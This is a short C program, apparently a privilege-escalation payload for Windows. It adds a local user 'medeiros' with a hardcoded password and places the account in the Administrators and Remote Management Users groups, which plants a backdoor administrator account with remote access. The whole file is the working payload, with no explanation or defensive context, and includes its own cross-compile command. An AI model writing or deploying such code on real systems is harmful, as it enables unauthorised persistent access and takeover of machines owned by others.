```
#include <stdlib.h>
//x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
int main ()
{
  int i;
  
  i = system ("net user medeiros password123@ /add");
  i = system ("net localgroup administrators medeiros /add");
  i = system ("net localgroup \"Remote Management Users\" medeiros /add");
  
  return 0;
}
```